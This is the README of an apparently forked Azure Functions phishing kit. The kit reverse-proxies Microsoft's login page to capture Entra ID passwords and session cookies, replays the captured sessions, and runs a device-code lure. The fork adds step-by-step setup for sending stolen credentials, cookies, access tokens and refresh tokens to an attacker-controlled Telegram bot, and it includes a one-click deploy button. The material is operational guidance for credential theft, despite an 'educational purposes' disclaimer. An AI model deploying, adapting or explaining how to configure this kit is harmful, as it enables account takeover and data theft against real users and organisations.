# Azure AiTM Function PoC

* Azure Function AiTM Phishing PoC for Entra ID accounts with automated replay of captured sessions.
* This code is provided for educational purposes only and provided withou any liability or warranty.
* Based on: https://github.com/zolderio/AITMWorker

Blog post: <https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05>

[![Deploy to Azure](https://aka.ms/deploytoazurebutton)](https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Flovelife202239-netizen%2Fo365%2Fmain%2Fazuredeploy.json)

## Modified: Telegram dispatch (replaces retired Teams webhooks)

Microsoft retired classic Teams incoming webhooks (M365 connector deprecation),
so captured credentials no longer arrive via `TEAMS_WEBHOOK_URI`. This fork sends
captures to a Telegram bot instead.

### 1. Create the bot
1. In Telegram, message @BotFather → `/newbot` → follow the prompts.
2. Save the bot token (format `123456789:AA...`).
3. Message your new bot once (any text) to open the chat.
4. Get your chat ID: message @userinfobot (or use `getUpdates` via
   `https://api.telegram.org/bot<TOKEN>/getUpdates` and read `chat.id`).

### 2. Configure
Set two app settings on the Function App (or pass as ARM template params):

| Setting | Value |
|---|---|
| `TELEGRAM_BOT_TOKEN` | the token from @BotFather |
| `TELEGRAM_CHAT_ID` | your chat ID (numeric) |

`TEAMS_WEBHOOK_URI` is kept as a fallback: if Telegram is not configured, the
original Teams webhook path is still attempted.

### What gets delivered
- `phishing` proxy: captured username/password and the three AiTM session
  cookies (ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie)
- `execution` replay: the replayed user (UPN, display name, ID), tenant
  verified domains, and the replayed access token
- `deviceCode` poll: completed device-code flow tokens (access + refresh)

## Original functions
- `phishing` — reverse proxy of login.microsoftonline.com, header/cookie
  rewriting, credential + session-cookie capture
- `execution` — POST /execution with captured cookies → OAuth auth-code →
  access token → /me + /organization
- `deviceCode` (GET) — OAuth device-code flow lure page
- `deviceCode` (PUT) — polls the device-code flow for up to 5 minutes
